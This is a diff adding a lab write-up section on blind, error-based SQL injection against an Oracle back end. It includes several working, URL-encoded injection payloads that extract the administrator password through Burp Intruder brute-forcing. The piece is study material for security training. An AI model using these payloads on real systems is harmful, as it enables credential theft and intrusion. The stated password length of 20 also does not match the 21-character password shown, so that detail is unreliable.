@@ -363,3 +363,67 @@ Piecing them together gives us the flag:
 `y4j1xzs4bdxkpc04a8b6`
 
 With the above, I logged into the site as `administrator` and finished the lab!
+
+---
+
+## 12. Blind SQL injection with conditional errors
+<img src="./blind-error.png" width=400>
+
+### Description
+A harder version of [11](#11-blind-sql-injection-with-conditional-responses). The lab is exactly the same, except the underlying application logic no longer responds conditionally. We are only able to see errors reflected through the HTML. To finish the lab, the details to the user `administrator` must be used to log in successfully.
+
+The value of the TrackingId field used for page analytics in this question is `ygERiCVbJs6ai6ZH`.
+
+### Solution
+First, I needed to find out the version of SQL running on the server. Since the server returns errors to the front end, we can try to see if it's MySQL/PostgreSQL first. If an error is returned, then it's likely to be Oracle. This time, we use concatenation as we do not have any feedback to tell between true or false using logical `AND` operations: 
+> `SELECT VERSION()` 
+> \>>> 
+> `ygERiCVbJs6ai6ZH'||(SELECT VERSION() FROM DUAL)+--+` 
+
+The reason why we use `FROM DUAL` regardless of version is because Oracle SQL DBs require a `FROM` statement to be used with `SELECT`. Since it's compatible with both, doing this will save us the checks. 
+
+Incidentally, the above returns a `500 Internal Server Error`, which means the database is likely Oracle. We can test this with the following: 
+> `SELECT banner FROM v$version WHERE ROWNUM=1` 
+> \>>> 
+> `ygERiCVbJs6ai6ZH'||(SELECT+banner+FROM+v$version+WHERE+ROWNUM%3d1)`
+
+We use `WHERE ROWNUM=1` here because in Oracle, `SELECT banner FROM v$version` may return multiple values. Since the former fragment of this query presumably only returns one row, the concatenation will break if we don't restrict the latter fragment to only return one row.
+
+The above request resulted in a `200 OK` when I submitted it, strongly suggesting that the underlying database is Oracle. Therefore the next step is to check whether the database `users` along with its columns `username` and `password` exist: 
+>`SELECT password FROM users WHERE username='administrator'` 
+> \>>> 
+> `ygERiCVbJs6ai6ZH'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')+--+`
+
+The above ensures that all three exist all in one query. If an error occurs at all, that means one of them does not exist, and extra checks are required to ascertain which one it is. When I tried the query, it returned a `200 OK`, meaning all three must exist as no errors occured.
+
+Similarly to [11](#11-blind-sql-injection-with-conditional-responses), we must now check how long the password is to prepare for the brute-force attack. However, as there is no way to engage with the response of the query, we must use a query that short-circuits into an error if a condition is fulfilled. One way we can do this is by using the following:
+> `SELECT CASE WHEN {case} THEN {out1} ELSE {out2} END`
+
+If we insert an error-invoking statement inside either `{out1}` or `{out2}`, then the server will show us a `500 Internal Server Error` when that condition is fulfilled, which makes it easy for us to tell if the `{case}` is fulfilled or not:
+> `SELECT CASE WHEN {case} THEN '' ELSE TO_CHAR(1/0) END`
+
+As seen, I chose `TO_CHAR(1/0)` as `1/0` will trigger a simple division-by-zero error. As for the `{case}`, we should use the length of the password:
+> `SELECT CASE WHEN LENGTH(password)>{seq} THEN '' ELSE TO_CHAR(1/0) END`
+
+`{seq}` will be iterated by BurpSuite Intruder's Cluster Bomb mode, which I've configured to go from 1 to 200. We put the error case after `ELSE` to make it easier to differentiate between a syntax error and a positive case. However, this query will work regardless should the conditions swap places, assuming the syntax is correct. The final payload is as follows:
+> `ygERiCVbJs6ai6ZH'||(SELECT+CASE+WHEN+LENGTH(password)>{seq}+THEN+''+ELSE+TO_CHAR(1/0)+END+FROM+users+WHERE+username%3d'administrator')+--+`
+
+The final part `WHERE username='administrator'` is important as the first half of the query will return only one row. If this is not present, then all the requests will return `500 Internal Server Error` if there is more than one entry in `users`.
+
+We receive the following results from Intruder:
+
+<img src="./blind-error-pwd-len.png" width=400>
+
+As seen, the status code goes from `200` to `500` as `seq=20`. This means that the password is of length exactly 20. With this, we can now start to brute-force the password, similar to [11](#11-blind-sql-injection-with-conditional-responses):
+> `SELECT CASE WHEN SUBSTR(password, {seq}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'` 
+> \>>>
+> `ygERiCVbJs6ai6ZH'||(SELECT+CASE+WHEN+SUBSTR(password,{seq},1)%3d'{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')+--+`
+
+~~Now we wait a century for 720 requests to finish...~~
+Done! The following is the result of the Cluster Bomb attack:
+<img src="./blind-error-pwd-brute.png" width=400>
+
+This time, I've filtered the results to requests whose responses were `500 Internal Server Error`, as it is available to the Community Edition. I think the columns filter by ASCII value, so the indices are spliced, but at least they're in order this time. Taking the above values and putting them in order, we get the password to `administrator`:
+> oplaoviu3v6obqe2dl4p3
+
+And with that, I logged in and the lab was completed!
